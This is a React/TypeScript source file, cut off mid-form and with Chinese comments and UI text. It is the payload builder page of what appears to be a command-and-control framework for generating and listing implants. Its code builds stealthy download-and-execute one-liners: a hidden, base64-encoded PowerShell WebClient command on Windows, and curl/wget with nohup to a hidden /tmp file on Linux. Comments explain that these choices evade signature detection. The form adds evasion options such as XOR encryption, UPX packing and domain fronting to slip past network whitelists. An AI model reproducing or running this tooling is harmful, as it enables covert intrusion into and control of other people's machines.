import { useState, useEffect, useCallback, useMemo } from 'react'
import { Plus, Download, RefreshCw, Settings, FileCode, Cpu, Server, Loader2, Trash2, Shield, Copy, CheckCircle2, Monitor, HardDrive, Terminal } from 'lucide-react'
import { builderApi, sessionApi, BuildRequest, BuilderInfo, type RelayNode } from '../api'
import { useToast, ToastContainer } from '../components/Toast'
import { DownloadProgress } from '../components/DownloadProgress'
import axios from 'axios'
import './Builds.css'

interface StoredImplant {
  id: string
  name: string
  format: string
  os: string
  arch: string
  protocol: string
  server_url: string
  size: number
  sha256: string
  filename: string
  created_at: number
}

export function Builds() {
  const [activeTab, setActiveTab] = useState<'builder' | 'list'>('builder')
  const [builderInfo, setBuilderInfo] = useState<BuilderInfo | null>(null)
  const [loading, setLoading] = useState(false)
  const [showModal, setShowModal] = useState(false)
  const [building, setBuilding] = useState(false)
  const [buildResult, setBuildResult] = useState<{ id: string; name: string; format: string; size: number; serverUrl: string; oneLiner?: string } | null>(null)

  // format -> 下载文件扩展名；未知格式原样返回，避免误转
  const formatToExt = (format: string): string => {
    const map: Record<string, string> = {
      exe: 'exe',
      dll: 'dll',
      so: 'so',
      raw: 'raw',
      bin: 'bin',
      txt: 'txt',
      shellcode: 'txt',
      shellcode_bin: 'bin',
    }
    return map[format] ?? format
  }
  const toast = useToast()

  // ---- 载荷列表 state ----
  const [implants, setImplants] = useState<StoredImplant[]>([])
  const [implantsLoading, setImplantsLoading] = useState(false)
  const [copiedSha256, setCopiedSha256] = useState<string | null>(null)
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null)
  // 一条命令上线弹窗：点击列表按钮弹出命令展示，避免 http 下剪贴板不可用导致"点不开"
  const [showOneLinerImp, setShowOneLinerImp] = useState<StoredImplant | null>(null)
  // 下载进度：按载荷 id 标记当前下载，加载中显示实时进度条
  const [dlProgress, setDlProgress] = useState<{ id: string; percent: number; loaded: number; total: number; done?: boolean } | null>(null)

  // 一条命令上线：在目标机执行该命令即可静默下载并运行载荷。
  // 下载端点 /api/v1/implant/payload/{id} 免认证，URL 直接用当前访问的后台地址。
  // Windows 用 PowerShell -enc（UTF-16LE Base64）执行，避开 Invoke-WebRequest /
  // -ep bypass 等明文特征，落地文件名随机化；Linux 用 curl（回退 wget）后台运行。
  const buildOneLinerFor = (imp: StoredImplant): string => {
    const osName = (imp.os || 'windows').toLowerCase()
    // 仅可直接运行的载荷支持一条命令上线：
    // Windows 为 exe/raw；Linux 为 bin/exe/raw（so 是动态库，不能直接执行）
    if (osName === 'linux') {
      if (imp.format !== 'exe' && imp.format !== 'raw' && imp.format !== 'bin') return ''
    } else if (osName === 'windows') {
      if (imp.format !== 'exe' && imp.format !== 'raw') return ''
    } else {
      return ''
    }
    const origin = window.location.origin
    const dl = `${origin}/api/v1/implant/payload/${imp.id}`
    if (osName === 'linux') {
      const tmp = `/tmp/.${randName(4)}`
      return `curl -fsSL '${dl}' -o ${tmp} 2>/dev/null || wget -qO ${tmp} '${dl}'; chmod +x ${tmp}; nohup ${tmp} >/dev/null 2>&1 &`
    }
    const tmp = `${randName(4)}.exe`
    const ps = `$p="$env:TEMP\\${tmp}";$w=New-Object Net.WebClient;$w.DownloadFile('${dl}',$p);Start-Process $p -WindowStyle Hidden`
    return `powershell -w hidden -nop -enc ${utf16leB64(ps)}`
  }

  // UTF-16LE Base64 编码，供 powershell -enc 使用，使下载 URL / 落地文件名在命令行中不可见
  const utf16leB64 = (s: string): string => {
    let bin = ''
    for (let i = 0; i < s.length; i++) {
      const c = s.charCodeAt(i)
      bin += String.fromCharCode(c & 0xff, (c >> 8) & 0xff)
    }
    return btoa(bin)
  }

  // 生成 n 位小写字母数字随机串，随机化载荷落地文件名，避免固定文件名被静态特征匹配
  const randName = (n: number): string => {
    const letters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    let s = ''
    for (let i = 0; i < n; i++) s += letters[Math.floor(Math.random() * letters.length)]
    return s
  }

  // 弹窗内展示的命令：仅在打开弹窗时生成一次，避免随机落地文件名每次渲染变化
  const oneLinerCmd = useMemo(
    () => (showOneLinerImp ? buildOneLinerFor(showOneLinerImp) : ''),
    [showOneLinerImp],
  )
  // 弹窗系统文案
  const oneLinerOs = showOneLinerImp
    ? (showOneLinerImp.os || 'windows').toLowerCase()
    : 'windows'
  const oneLinerOsLabel = oneLinerOs === 'linux' ? 'Linux' : 'Windows'
  const oneLinerTitle = oneLinerOs === 'linux' ? 'Shell 命令' : 'PowerShell 命令'

  // 复制文本到剪贴板：优先使用 Clipboard API，HTTP 非 localhost 环境
  // 不可用时降级为 execCommand，避免点击按钮无任何反应
  const copyToClipboard = (text: string): boolean => {
    try {
      if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text)
        return true
      }
    } catch {
      // fallthrough 到降级方案
    }
    try {
      const ta = document.createElement('textarea')
      ta.value = text
      ta.style.position = 'fixed'
      ta.style.opacity = '0'
      document.body.appendChild(ta)
      ta.select()
      const ok = document.execCommand('copy')
      ta.remove()
      return ok
    } catch {
      return false
    }
  }

  const copyCommand = (cmd: string) => {
    if (copyToClipboard(cmd)) {
      setCopiedCmd(cmd)
      setTimeout(() => setCopiedCmd(null), 1500)
      toast.success('命令已复制')
    } else {
      toast.error('复制失败，请手动选中命令复制')
    }
  }

  const api = axios.create({
    baseURL: '/api/v1',
    headers: { 'Content-Type': 'application/json' },
  })
  api.interceptors.request.use((config) => {
    const token = localStorage.getItem('toshell-token')
    if (token) config.headers.Authorization = `Bearer ${token}`
    return config
  })

  const fetchImplants = useCallback(async () => {
    setImplantsLoading(true)
    try {
      const res = await api.get<{ implants: StoredImplant[] }>('/implants/stored')
      setImplants(res.data.implants || [])
    } catch (err) {
      console.error('Failed to fetch implants:', err)
    } finally {
      setImplantsLoading(false)
    }
  }, [])

  const handleImplantDownload = async (imp: StoredImplant) => {
    const id = imp.id
    setDlProgress({ id, percent: 0, loaded: 0, total: 0 })
    try {
      const res = await api.get(`/implants/stored/${id}`, {
        responseType: 'blob',
        onDownloadProgress: (e) => {
          setDlProgress(prev => ({
            id,
            percent: e.total ? Math.min(100, Math.round((e.loaded / e.total) * 100)) : (prev?.percent ?? 0),
            loaded: e.loaded,
            total: e.total || 0,
          }))
        },
      })
      const url = window.URL.createObjectURL(new Blob([res.data]))
      const link = document.createElement('a')
      link.href = url
      // 使用友好的 name.ext 作为下载文件名，磁盘上的唯一 ID 文件名不对用户暴露
      const ext = formatToExt(imp.format)
      const dlName = ext ? `${imp.name}.${ext}` : imp.name
      link.download = dlName
      document.body.appendChild(link)
      link.click()
      link.remove()
      window.URL.revokeObjectURL(url)
      // 下载完成后短暂显示"下载完成"再收起
      setDlProgress({ id, percent: 100, loaded: res.data.size, total: res.data.size, done: true })
      setTimeout(() => setDlProgress(prev => (prev?.id === id ? null : prev)), 900)
      toast.success(`下载成功: ${dlName}`)
    } catch {
      setDlProgress(prev => (prev?.id === id ? null : prev))
      toast.error('下载失败')
    }
  }

  const handleImplantDelete = async (imp: StoredImplant) => {
    try {
      await api.delete(`/implants/${imp.id}`)
      setImplants(prev => prev.filter(i => i.id !== imp.id))
      toast.success(`已删除: ${imp.name}`)
    } catch {
      toast.error('删除失败')
    }
  }

  const copySHA256 = (sha256: string) => {
    if (copyToClipboard(sha256)) {
      setCopiedSha256(sha256)
      setTimeout(() => setCopiedSha256(null), 1500)
    }
  }

  const formatTime = (ts: number) => new Date(ts * 1000).toLocaleString('zh-CN')
  const formatSize = (bytes: number) => {
    if (bytes < 1024) return `${bytes} B`
    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(2)} KB`
    return `${(bytes / (1024 * 1024)).toFixed(2)} MB`
  }
  const OS_ICON: Record<string, React.ReactNode> = {
    windows: <Monitor size={14} />,
    linux: <Server size={14} />,
    darwin: <Cpu size={14} />,
  }

  const [relayNodes, setRelayNodes] = useState<RelayNode[]>([])

  const fetchRelayNodes = useCallback(async () => {
    try {
      const res = await sessionApi.listRelayNodes()
      setRelayNodes(res.data.relay_nodes || [])
    } catch {
      setRelayNodes([])
    }
  }, [])

  const [formData, setFormData] = useState<BuildRequest>({
    name: '',
    format: 'exe',
    language: 'go',
    listener_id: '',
    server_url: '',
    protocol: 'tcp',
    interval: 60,
    jitter: 10,
    retry_count: 3,
    retry_wait: 5,
    kill_date: '',
    working_hours: '',
    relay_listen: '',
    front_domain: '',
    profile: 'full',
    output_path: '',
    os: 'windows',
    arch: 'amd64',
    // Evasion defaults
    xor_encrypt: false,
    xor_key_size: 16,
    garble_enabled: false,
    upx_enabled: false,
  })

  const fetchData = async () => {
    setLoading(true)
    try {
      const builderRes = await builderApi.list()
      setBuilderInfo(builderRes.data)
    } catch (error) {
      console.error('Failed to fetch data:', error)
      setBuilderInfo({
        formats: ['exe', 'dll', 'shellcode', 'raw'],
        protocols: ['tcp', 'http', 'https'],
        os: ['windows', 'linux', 'darwin'],
        arch: ['amd64', '386', 'arm64'],
        listeners: [],
        options: {
          interval: { min: 1, max: 300, default: 60 },
          jitter: { min: 0, max: 100, default: 10 },
          retry_count: { min: 0, max: 10, default: 3 },
          retry_wait: { min: 1, max: 60, default: 5 },
        },
      })
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
    fetchData()
    fetchRelayNodes()
    
    // 从localStorage读取构建结果
    const savedResult = localStorage.getItem('buildResult')
    if (savedResult) {
      try {
        const parsedResult = JSON.parse(savedResult)
        // 确保结构完整
        if (!parsedResult.serverUrl) {
          parsedResult.serverUrl = formData.server_url
        }
        setBuildResult(parsedResult)
      } catch (error) {
        console.error('Failed to parse saved build result:', error)
      }
    }
  }, [formData.server_url])

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value, type } = e.target as HTMLInputElement
    setFormData(prev => {
      let newVal: any = value
      
      // Checkboxes
      if (type === 'checkbox') {
        newVal = (e.target as HTMLInputElement).checked
      } else if (name === 'xor_key_size') {
        newVal = parseInt(value) || 16
      } else if (name === 'interval' || name === 'jitter' || name === 'retry_count' || name === 'retry_wait') {
        newVal = parseInt(value) || 0
      }
      
      const newData = {
        ...prev,
        [name]: newVal
      }
      
      // 当目标系统改变时，自动调整输出格式
      if (name === 'os') {
        if (value === 'windows') {
          newData.format = 'exe'
        } else {
          newData.format = 'bin'
        }
      }
      
      // 语言切换：C 植入端仅支持 Windows exe，自动约束
      if (name === 'language') {
        if (value === 'c') {
          newData.os = 'windows'
          newData.arch = 'amd64'
          newData.format = 'exe'
          newData.profile = 'light' // C 植入端天然精简，profile 无意义
        } else {
          newData.profile = prev.profile === 'light' ? 'full' : prev.profile
        }
      }
      
      return newData
    })
  }

  const handleServerUrlKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter' && !formData.server_url) {
      e.preventDefault()
      const defaultUrl = 'ws://localhost:8080'
      setFormData(prev => ({
        ...prev,
        server_url: defaultUrl
      }))
      toast.info(`已填写默认服务器地址: ${defaultUrl}`)
    }
  }

  const handleBuild = async () => {
    if (!formData.server_url) {
      toast.warning('请输入服务器地址')
      return
    }

    setBuilding(true)
    try {
      const response = await builderApi.create(formData)
      const result = {
        id: response.data.id,
        name: response.data.name,
        format: response.data.format,
        size: response.data.size,
        serverUrl: formData.server_url,
        oneLiner: response.data.one_liner || '',
      }
      setBuildResult(result)
      
      // 存储到localStorage
      localStorage.setItem('buildResult', JSON.stringify(result))
      
      setShowModal(false)
      toast.success(`载荷构建成功！名称: ${result.name}, 大小: ${(result.size / 1024).toFixed(2)} KB`)
    } catch (error) {
      console.error('Failed to build payload:', error)
      toast.error('构建失败，请检查配置')
    } finally {
      setBuilding(false)
    }
  }

  const handleDownload = async () => {
    if (!buildResult) {
      toast.warning('请先构建载荷')
      return
    }

    // 旧版本 localStorage 没有记录构建 ID，无法精确定位到文件，
    // 引导用户到「载荷列表」中下载，避免误触发重新构建。
    if (!buildResult.id) {
      toast.info('旧构建记录无法直接下载，请到「载荷列表」中选择对应载荷下载')
      return
    }

    const id = buildResult.id
    setDlProgress({ id, percent: 0, loaded: 0, total: 0 })
    try {
      // 直接用构建 ID 下载已生成的载荷文件，绝不会重新构建
      const response = await api.get(`/implants/stored/${id}`, {
        responseType: 'blob',
        onDownloadProgress: (e) => {
          setDlProgress(prev => ({
            id,
            percent: e.total ? Math.min(100, Math.round((e.loaded / e.total) * 100)) : (prev?.percent ?? 0),
            loaded: e.loaded,
            total: e.total || 0,
          }))
        },
      })
      const url = window.URL.createObjectURL(new Blob([response.data]))
      const link = document.createElement('a')
      link.href = url

      const ext = formatToExt(buildResult.format)
      link.setAttribute('download', ext ? `${buildResult.name}.${ext}` : buildResult.name)
      document.body.appendChild(link)
      link.click()
      link.remove()
      window.URL.revokeObjectURL(url)
      // 下载完成后短暂显示"下载完成"再收起
      setDlProgress({ id, percent: 100, loaded: response.data.size, total: response.data.size, done: true })
      setTimeout(() => setDlProgress(prev => (prev?.id === id ? null : prev)), 900)
      toast.success('载荷下载成功')
    } catch (error) {
      console.error('Failed to download payload:', error)
      setDlProgress(prev => (prev?.id === id ? null : prev))
      toast.error('下载失败，请到「载荷列表」中确认载荷是否存在')
    }
  }

  const handleDelete = () => {
    // 从localStorage删除构建结果
    localStorage.removeItem('buildResult')
    // 清除状态
    setBuildResult(null)
    // 显示成功提示
    toast.success('载荷已删除')
  }

  return (
    <div className="builds-page">
      <ToastContainer toasts={toast.toasts} removeToast={toast.removeToast} />
      <div className="page-header">
        <div className="header-title">
          <FileCode size={24} />
          <h1>载荷</h1>
        </div>
        <div className="header-actions">
          {activeTab === 'builder' ? (
            <>
              <button className="btn btn-secondary" onClick={fetchData}>
                <RefreshCw size={16} className={loading ? 'spinning' : ''} />
                刷新
              </button>
              <button className="btn btn-primary" onClick={() => { fetchData(); setShowModal(true); }}>
                <Plus size={16} />
                生成载荷
              </button>
            </>
          ) : (
            <>
              <button className="btn btn-secondary" onClick={fetchImplants}>
                <RefreshCw size={16} className={implantsLoading ? 'spinning' : ''} />
                刷新
              </button>
            </>
          )}
        </div>
      </div>

      {/* Tab 切换 */}
      <div className="tab-bar">
        <button
          className={`tab-btn ${activeTab === 'builder' ? 'active' : ''}`}
          onClick={() => setActiveTab('builder')}
        >
          <FileCode size={16} />
          生成载荷
        </button>
        <button
          className={`tab-btn ${activeTab === 'list' ? 'active' : ''}`}
          onClick={() => { setActiveTab('list'); fetchImplants(); }}
        >
          <HardDrive size={16} />
          载荷列表
          {implants.length > 0 && (
            <span className="tab-badge">{implants.length}</span>
          )}
        </button>
      </div>

      {activeTab === 'builder' ? (
        /* ==================== 生成载荷 ==================== */
        <div className="builds-content">
          <div className="build-info-cards">
            <div className="info-card">
              <div className="info-icon"><FileCode size={24} /></div>
              <div className="info-text">
                <span className="info-label">支持格式</span>
                <span className="info-value">{builderInfo?.formats?.join(', ') || 'exe, dll, shellcode, raw'}</span>
              </div>
            </div>
            <div className="info-card">
              <div className="info-icon"><Cpu size={24} /></div>
              <div className="info-text">
                <span className="info-label">支持协议</span>
                <span className="info-value">{builderInfo?.protocols?.join(', ') || 'tcp, http, https'}</span>
              </div>
            </div>
            <div className="info-card">
              <div className="info-icon"><Server size={24} /></div>
              <div className="info-text">
                <span className="info-label">支持系统</span>
                <span className="info-value">{builderInfo?.os?.join(', ') || 'windows, linux, darwin'}</span>
              </div>
            </div>
            <div className="info-card">
              <div className="info-icon"><Cpu size={24} /></div>
              <div className="info-text">
                <span className="info-label">支持架构</span>
                <span className="info-value">{builderInfo?.arch?.join(', ') || 'amd64, 386, arm64'}</span>
              </div>
            </div>
          </div>

          {buildResult && (
            <div className="build-result-card">
              <h3>上次构建</h3>
              <div className="result-info">
                <div className="result-item"><span className="result-label">名称</span><span className="result-value">{buildResult.name}</span></div>
                <div className="result-item"><span className="result-label">格式</span><span className="result-value">{buildResult.format}</span></div>
                <div className="result-item"><span className="result-label">大小</span><span className="result-value">{(buildResult.size / 1024).toFixed(2)} KB</span></div>
                <div className="result-item server-url"><span className="result-label">服务器地址</span><span className="result-value">{buildResult.serverUrl}</span></div>
              </div>
              {buildResult.oneLiner && (
                <div className="oneliner-box">
                  <div className="oneliner-header">
                    <span style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontWeight: 600 }}>
                      <Terminal size={14} /> 一条命令上线
                    </span>
                    <button className="oneliner-copy-btn" onClick={() => copyCommand(buildResult.oneLiner!)} title="复制命令">
                      {copiedCmd === buildResult.oneLiner ? <CheckCircle2 size={14} /> : <Copy size={14} />}
                      {copiedCmd === buildResult.oneLiner ? '已复制' : '复制'}
                    </button>
                  </div>
                  <code className="oneliner-code">{buildResult.oneLiner}</code>
                  <p className="oneliner-hint">在目标 Windows 主机上执行该命令，即可静默下载并运行此载荷（对应所选监听器）</p>
                </div>
              )}
              <div className="build-result-actions">
                <button className="btn btn-primary" onClick={handleDownload}><Download size={16} />下载载荷</button>
                <button className="btn btn-danger" onClick={handleDelete}><Trash2 size={16} />删除载荷</button>
              </div>
              {dlProgress?.id === buildResult.id && (
                <DownloadProgress percent={dlProgress.percent} loaded={dlProgress.loaded} total={dlProgress.total} done={dlProgress.done} />
              )}
            </div>
          )}
        </div>
      ) : (
        /* ==================== 载荷列表 ==================== */
        <div className="builds-content">
          {implants.length === 0 && !implantsLoading ? (
            <div style={{ textAlign: 'center', padding: '60px 20px', color: 'var(--color-text-muted)' }}>
              <FileCode size={48} style={{ marginBottom: 16, opacity: 0.4 }} />
              <p style={{ fontSize: 16, marginBottom: 8 }}>暂无载荷记录</p>
              <p style={{ fontSize: 13 }}>
                点击上方<span style={{ color: 'var(--color-primary)', cursor: 'pointer' }} onClick={() => setActiveTab('builder')}>「生成载荷」</span>创建新载荷
              </p>
            </div>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
              {implants.map((imp) => (
                <div key={imp.id} className="build-result-card" style={{ padding: '20px 24px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 12 }}>
                        <h3 style={{ margin: 0 }}>{imp.name}</h3>
                        <span style={{ padding: '2px 10px', borderRadius: 4, fontSize: 11, fontWeight: 600, background: 'var(--color-bg)', border: '1px solid var(--color-border)', color: 'var(--color-text-secondary)', textTransform: 'uppercase' }}>{imp.format}</span>
                        <span style={{ display: 'inline-flex', alignItems: 'center', gap: 4, padding: '2px 8px', borderRadius: 4, fontSize: 11, background: 'var(--color-bg)', border: '1px solid var(--color-border)', color: 'var(--color-text-secondary)' }}>
                          {OS_ICON[imp.os] || <Cpu size={14} />}
                          {(imp.os || 'unknown')}/{imp.arch || '-'}
                        </span>
                      </div>
                      <div className="result-info" style={{ marginBottom: 0 }}>
                        <div className="result-item"><span className="result-label">大小</span><span className="result-value">{formatSize(imp.size)}</span></div>
                        <div className="result-item"><span className="result-label">协议</span><span className="result-value">{(imp.protocol || 'HTTP').toUpperCase()}</span></div>
                        <div className="result-item server-url"><span className="result-label">服务器</span><span className="result-value">{imp.server_url}</span></div>
                        <div className="result-item"><span className="result-label">创建时间</span><span className="result-value">{formatTime(imp.created_at)}</span></div>
                      </div>
                      {imp.sha256 && (
                        <div style={{ marginTop: 10, display: 'flex', alignItems: 'center', gap: 8, fontSize: 12, fontFamily: 'var(--font-mono)', color: 'var(--color-text-muted)' }}>
                          <Shield size={12} />
                          <span style={{ opacity: 0.7 }}>SHA256:</span>
                          <code style={{ padding: '1px 6px', borderRadius: 3, background: 'var(--color-bg)', fontSize: 11 }}>{imp.sha256.substring(0, 16)}...</code>
                          <button onClick={() => copySHA256(imp.sha256)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: copiedSha256 === imp.sha256 ? 'var(--color-success)' : 'var(--color-text-muted)', padding: 0, display: 'flex' }} title="复制 SHA256">
                            {copiedSha256 === imp.sha256 ? <CheckCircle2 size={14} /> : <Copy size={14} />}
                          </button>
                        </div>
                      )}
                    </div>
                  </div>
                  <div className="build-result-actions" style={{ marginTop: 12 }}>
                    <button className="btn btn-primary" onClick={() => handleImplantDownload(imp)}><Download size={16} />下载</button>
                    {buildOneLinerFor(imp) && (
                      <button className="btn btn-secondary" onClick={() => setShowOneLinerImp(imp)} title="查看一条命令上线命令">
                        <Terminal size={16} />
                        一条命令上线
                      </button>
                    )}
                    <button className="btn btn-danger" onClick={() => handleImplantDelete(imp)}><Trash2 size={16} />删除</button>
                  </div>
                  {dlProgress?.id === imp.id && (
                    <DownloadProgress percent={dlProgress.percent} loaded={dlProgress.loaded} total={dlProgress.total} done={dlProgress.done} />
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {/* 一条命令上线弹窗 */}
      {showOneLinerImp && (
        <div className="modal-overlay" onClick={() => setShowOneLinerImp(null)}>
          <div className="modal" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h2>一条命令上线</h2>
              <button className="close-btn" onClick={() => setShowOneLinerImp(null)}>×</button>
            </div>
            <div className="modal-body">
              <p style={{ marginBottom: 12, fontSize: 13, lineHeight: 1.6, color: 'var(--color-text-secondary)' }}>
                在目标 {oneLinerOsLabel} 主机上执行以下命令，将静默下载并运行「{showOneLinerImp.name}」
                （对应 {(showOneLinerImp.protocol || 'HTTP').toUpperCase()} 监听器）：
              </p>
              <div className="oneliner-box">
                <div className="oneliner-header">
                  <span style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontWeight: 600 }}>
                    <Terminal size={14} /> {oneLinerTitle}
                  </span>
                  <button className="oneliner-copy-btn" onClick={() => copyCommand(oneLinerCmd)} title="复制命令">
                    {copiedCmd === oneLinerCmd ? <CheckCircle2 size={14} /> : <Copy size={14} />}
                    {copiedCmd === oneLinerCmd ? '已复制' : '复制'}
                  </button>
                </div>
                <code className="oneliner-code">{oneLinerCmd}</code>
              </div>
              <p className="oneliner-hint">复制按钮在 http 访问下可能不可用，可直接选中上方命令文本手动复制。</p>
            </div>
            <div className="modal-footer">
              <button className="btn btn-secondary" onClick={() => setShowOneLinerImp(null)}>关闭</button>
            </div>
          </div>
        </div>
      )}

      {/* 生成载荷弹窗 */}
      {showModal && (
        <div className="modal-overlay" onClick={() => setShowModal(false)}>
          <div className="modal" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <h2>生成载荷</h2>
              <button className="close-btn" onClick={() => setShowModal(false)}>×</button>
            </div>
            <div className="modal-body">
              <div className="form-group">
                <label>载荷名称</label>
                <input
                  type="text"
                  name="name"
                  value={formData.name}
                  onChange={handleInputChange}
                  placeholder="my-implant"
                />
              </div>

              <div className="form-group">
                <label>选择监听器</label>
                <select
                  name="listener_id"
                  value={formData.listener_id}
                  onChange={(e) => {
                    const id = e.target.value
                    const listener = builderInfo?.listeners?.find((l) => l.id === id)
                    if (listener) {
                      // 优先使用手动配置的公网地址；没有则用绑定地址（0.0.0.0 回退到 localhost）
                      const host = listener.public_addr
                        ? listener.public_addr
                        : listener.bind_addr === '0.0.0.0' || !listener.bind_addr
                          ? 'localhost'
                          : listener.bind_addr
                      // 按监听器类型自动选择协议与地址格式：
                      // tcp/websocket → host:port（无前缀，走自定义 TCP 帧通道）
                      // http/https → http(s)://host:port（HTTP 轮询/域前置）
                      const lp = (listener.protocol || 'http').toLowerCase()
                      let url: string
                      let proto: string
                      if (lp === 'tcp' || lp === 'websocket') { url = `${host}:${listener.bind_port}`; proto = 'tcp' }
                      else if (lp === 'https') { url = `https://${host}:${listener.bind_port}`; proto = 'https' }
                      else { url = `http://${host}:${listener.bind_port}`; proto = 'http' }
                      setFormData((prev) => ({
                        ...prev,
                        listener_id: id,
                        server_url: url,
                        protocol: proto,
                      }))
                    } else {
                      setFormData((prev) => ({ ...prev, listener_id: id }))
                    }
                  }}
                >
                  <option value="">-- 不选择（手动填写地址） --</option>
                  {builderInfo?.listeners?.map((l) => (
                    <option key={l.id} value={l.id}>
                      {l.name} ({l.type === 'http' ? 'HTTP' : 'TCP'} · {l.public_addr || l.bind_addr}:{l.bind_port}) {l.status === 'running' ? '●' : ''}
                    </option>
                  ))}
                </select>
                {builderInfo?.listeners && builderInfo.listeners.length > 0 && (
                  <span className="field-hint">选择监听后自动填写服务器地址与协议</span>
                )}
              </div>

              <div className="form-row form-row-3">
                <div className="form-group">
                  <label>植入端语言</label>
                  <select name="language" value={formData.language || 'go'} onChange={handleInputChange}>
                    <option value="go">Go（全功能）</option>
                    <option value="c" disabled={!builderInfo?.languages?.c}>
                      C（超小体积 ~50KB）{!builderInfo?.languages?.c ? ' — 服务端无 mingw gcc' : ''}
                    </option>
                  </select>
                  {formData.language === 'c' ? (
                    <p className="form-hint" style={{ color: 'var(--color-success)' }}>
                      C 植入端：仅 Windows exe，支持命令执行 / 文件列表，注册 / 心跳 / 任务回传全链路
                    </p>
                  ) : (
                    <p className="form-hint">Go 植入端全功能；C 植入端体积极小但功能受限</p>
                  )}
                </div>
              </div>

              <div className="form-row form-row-3">
                <div className="form-group">
                  <label>输出格式</label>
                  <select name="format" value={formData.format} onChange={handleInputChange}>
                    {formData.os === 'windows' ? (
                      <>
                        <option value="exe">EXE 可执行文件</option>
                        <option value="dll">DLL 动态库</option>
                        <option value="shellcode">Shellcode (Hex字符串)</option>
                        <option value="shellcode_bin">Shellcode (.bin文件)</option>
                        <option value="raw">Raw</option>
                      </>
                    ) : (
                      <>
                        <option value="bin">ELF 可执行文件</option>
                        <option value="so">SO 动态库</option>
                        <option value="raw">Raw</option>
                      </>
                    )}
                  </select>
                </div>
                <div className="form-group">
                  <label>回连通道</label>
                  <select name="protocol" value={formData.protocol} onChange={handleInputChange}>
                    <option value="tcp">TCP（推荐）</option>
                    <option value="http">HTTP（轮询）</option>
                    <option value="https">HTTPS（轮询 + TLS）</option>
                  </select>
                  <p className="form-hint">TCP 填 host:port，HTTP(S) 填完整 URL</p>
                </div>
                <div className="form-group">
                  <label>构建档案</label>
                  <select name="profile" value={formData.profile} onChange={handleInputChange}>
                    <option value="full">完整（全功能）</option>
                    <option value="light">精简（小体积）</option>
                  </select>
                  <p className="form-hint">精简档案裁剪截图/中继/注入等模块</p>
                </div>
              </div>

              <div className="form-row">
                <div className="form-group">
                  <label>目标系统</label>
                  <select name="os" value={formData.os} onChange={handleInputChange}>
                    <option value="windows">Windows</option>
                    <option value="linux">Linux</option>
                    <option value="darwin">macOS</option>
                  </select>
                </div>
                <div className="form-group">
                  <label>目标架构</label>
                  <select name="arch" value={formData.arch} onChange={handleInputChange}>
                    <option value="amd64">x64 (AMD64)</option>
                    <option value="386">x86 (i386)</option>
                    <option value="arm64">ARM64</option>
                  </select>
                </div>
              </div>

              <div className="form-group">
                <label style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                  选择中继会话（可选，链式回连）
                  <button type="button" className="btn-small" onClick={fetchRelayNodes} title="刷新中继列表">
                    <RefreshCw size={12} /> 刷新
                  </button>
                </label>
                <select
                  value=""
                  onChange={(e) => {
                    const sid = e.target.value
                    if (!sid) return
                    const node = relayNodes.find((n) => n.session_id === sid)
                    if (node && node.host && node.port) {
                      setFormData((prev) => ({ ...prev, server_url: `${node.host}:${node.port}` }))
                    }
                  }}
                >
                  <option value="">-- 选择已启动的中继会话 --</option>
                  {relayNodes.map((n) => (
                    <option key={n.session_id} value={n.session_id}>
                      {n.hostname}（{n.host}:{n.port}）
                    </option>
                  ))}
                </select>
                {relayNodes.length > 0 ? (
                  <span className="field-hint">选择后自动把「服务器地址」填为中继地址（叶子直接连中继，不经团队服务器）</span>
                ) : (
                  <span className="field-hint">暂无中继节点：先在出口主机会话的「中继」页启动中继，再点「刷新」</span>
                )}
              </div>

              <div className="form-group">
                <label>服务器地址 (C2) <span style={{color: 'var(--color-danger)'}}>*</span></label>
                <input
                  type="text"
                  name="server_url"
                  value={formData.server_url}
                  onChange={handleInputChange}
                  onKeyPress={handleServerUrlKeyPress}
                  placeholder="例如: 192.168.1.10:9999（直连填团队服务器地址）"
                />
                <p className="form-hint">
                  直连团队服务器填其地址；链式回连填中继 IP:端口（也可用「选择中继会话」自动填）
                </p>
                <p className="form-hint">
                  {formData.protocol === 'tcp'
                    ? <span style={{ color: 'var(--color-warning, #f59e0b)' }}>TCP 通道请勿加 http:// 前缀（填 host:port，误加自动剥离）</span>
                    : <span style={{ color: 'var(--color-primary, #60a5fa)' }}>HTTP/HTTPS 通道需以 http(s):// 开头（配合「域前置拟态域名」过白名单）</span>}
                </p>
              </div>

              <div className="form-group">
                <label>域前置拟态域名（可选）</label>
                <input
                  type="text"
                  name="front_domain"
                  value={formData.front_domain}
                  onChange={handleInputChange}
                  placeholder="例如: cdn.example.com（配合 https:// 服务器地址走 CDN 白名单出口）"
                />
                <p className="form-hint">
                  服务器地址以 <code>https://</code> 开头时启用 HTTPS 轮询通道；此处填合法 CDN/反代域名，
                  植入端 TLS SNI 与 HTTP Host 均伪装为该域名（域前置），目标机出站流量表现为访问合法域名。
                </p>
              </div>

              <div className="form-section">
                <h4><Settings size={16} /> 高级选项</h4>
                <div className="form-row">
                  <div className="form-group">
                    <label>心跳间隔 (秒)</label>
                    <input
                      type="number"
                      name="interval"
                      value={formData.interval}
                      onChange={handleInputChange}
                      min={1}
                      max={300}
                    />
                  </div>
                  <div className="form-group">
                    <label>抖动 (%)</label>
                    <input
                      type="number"
                      name="jitter"
                      value={formData.jitter}
                      onChange={handleInputChange}
                      min={0}
                      max={100}
                    />
                  </div>
                </div>
                <div className="form-row">
                  <div className="form-group">
                    <label>重试次数</label>
                    <input
                      type="number"
                      name="retry_count"
                      value={formData.retry_count}
                      onChange={handleInputChange}
                      min={0}
                      max={10}
                    />
                  </div>
                  <div className="form-group">
                    <label>重试间隔 (秒)</label>
                    <input
                      type="number"
